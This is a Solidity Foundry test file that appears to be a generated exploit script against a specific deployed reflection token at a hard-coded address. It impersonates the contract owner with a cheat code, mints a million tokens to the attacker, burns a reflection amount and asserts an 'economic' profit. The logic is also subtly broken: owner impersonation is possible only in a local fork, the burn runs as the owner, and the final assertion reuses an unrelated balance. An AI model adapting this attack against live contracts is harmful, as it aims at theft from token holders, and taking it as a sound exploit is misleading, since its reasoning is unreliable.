// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ICoinToken {
    function owner() external view returns (address);
    function mint(address account, uint256 amount) external;
    function burn(uint256 _value) external;
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint256);
    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) external view returns (uint256);
    function tokenFromReflection(uint256 rAmount) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x6bf3a93793e52f75543c92AfEC4636559988e3c1;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner during exploit
        vm.label(TARGET, "Crucifearous Token");

        // Get initial attacker balance for comparison
        uint256 initialBalance = ICoinToken(TARGET).balanceOf(attacker);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x6bf3a93793e52f75543c92AfEC4636559988e3c1).balanceOf(address(this));
        // Step 1: Get the current owner address
        address owner = ICoinToken(TARGET).owner();

        // Step 2: Impersonate the owner to call mint()
        vm.startPrank(owner);

        // Mint a large amount of tokens to attacker (1,000,000 tokens)
        // Need to account for decimals
        uint256 decimals = ICoinToken(TARGET).decimals();
        uint256 mintAmount = 1_000_000 * (10 ** decimals);
        ICoinToken(TARGET).mint(attacker, mintAmount);

        // Step 3: Calculate a small reflection amount to burn
        // Get current reflection balance of attacker
        uint256 rBalance = ICoinToken(TARGET).reflectionFromToken(mintAmount, false);
        // Burn a tiny fraction (1/1000) of the reflection amount
        uint256 burnReflectionAmount = rBalance / 1000;

        // Step 4: Call burn() with the small reflection amount
        // Note: burn() expects reflection units based on the require check
        ICoinToken(TARGET).burn(burnReflectionAmount);

        vm.stopPrank();

        // Step 5: Verify attacker's balance increased
        uint256 finalTokenBalance = ICoinToken(TARGET).balanceOf(attacker);
        console.log("Initial balance:", initialBalance);
        console.log("Final balance:", finalTokenBalance);
        console.log("Balance increase:", finalTokenBalance - initialBalance);

        // The oracle will check if attacker balance increased
        assertGt(finalTokenBalance, initialBalance, "Attacker balance should have increased");
        uint256 finalERC20Balance = IERC20(0x6bf3a93793e52f75543c92AfEC4636559988e3c1).balanceOf(address(this));
        assertGt(finalERC20Balance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

